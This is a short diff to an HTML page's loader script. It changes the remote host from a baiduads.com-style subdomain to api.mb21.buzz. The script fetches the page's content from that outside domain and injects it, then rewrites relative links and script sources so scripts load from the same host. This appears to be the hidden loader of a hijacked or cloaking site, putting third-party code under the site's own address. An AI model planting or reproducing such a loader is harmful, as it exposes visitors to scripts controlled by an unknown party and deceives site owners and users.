@@ -3,9 +3,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="dns-prefetch" href="//waf-j.b.j-gmqnfz7c93.baiduads.com">
-  <link rel="preconnect" href="//waf-j.b.j-gmqnfz7c93.baiduads.com">
+  <link rel="dns-prefetch" href="//api.mb21.buzz">
+  <link rel="preconnect" href="//api.mb21.buzz">
    <script type="text/javascript" src="/lozad.min.js"></script>
    <style>
        .loaderbg {
@@ -110,7 +109,7 @@
 <script type='text/javascript'>
 const currentPath = window.location.pathname + window.location.search;
 
-const fetchUrl = '//waf-j.b.j-gmqnfz7c93.baiduads.com' + currentPath;
+const fetchUrl = '//api.mb21.buzz' + currentPath;
 
 fetch(fetchUrl)
   .then(response => response.text())
@@ -130,7 +129,7 @@ fetch(fetchUrl)
     for (var i = 0; i < links.length; i++) {
       var href = links[i].getAttribute('href');
       if (href && (href.startsWith('/') || !href.includes('http'))) {
-        links[i].href = '//waf-j.b.j-gmqnfz7c93.baiduads.com' + (href.startsWith('/') ? href : '/' + href);
+        links[i].href = '//api.mb21.buzz' + (href.startsWith('/') ? href : '/' + href);
       }
     }
 
@@ -139,7 +138,7 @@ fetch(fetchUrl)
     for (var i = 0; i < scripts.length; i++) {
       var src = scripts[i].getAttribute('src');
       if (src && (src.startsWith('/') || !src.includes('http'))) {
-        scripts[i].src = '//waf-j.b.j-gmqnfz7c93.baiduads.com' + (src.startsWith('/') ? src : '/' + src);
+        scripts[i].src = '//api.mb21.buzz' + (src.startsWith('/') ? src : '/' + src);
       }
     }
 
